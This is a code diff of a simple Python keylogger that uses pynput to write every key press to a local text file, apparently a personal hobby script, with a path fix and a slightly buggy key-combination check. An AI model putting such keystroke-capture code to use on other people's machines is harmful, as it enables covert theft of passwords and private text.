@@ -2,27 +2,22 @@ import os
 from pynput.keyboard import Key, Listener
 
 if not os.path.exists('/home/umang/python-scripts/test.txt'):
-    os.mknod('/home/umang/python-scriptsr/test.txt')
+    os.mknod('/home/umang/python-scripts/test.txt')
 
 file = open("test.txt", "w")
+combination = {Key.alt and Key.tab}
 
 
 def on_press(key):
-    print('{0} pressed'.format(key))
-    if key == Key.space:
-        file.write(" ")
-    elif key == Key.backspace:
-        file.write("")
-    elif key == Key.esc:
-        file.close()
-    else:
-        file.write(str(key))
+    if key in combination:
+        print("Writing to file... ")
+    file.write(str(key))
 
 
 def on_release(key):
     if key == Key.esc:
         file.close()
-        return False
+        listener.stop()
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
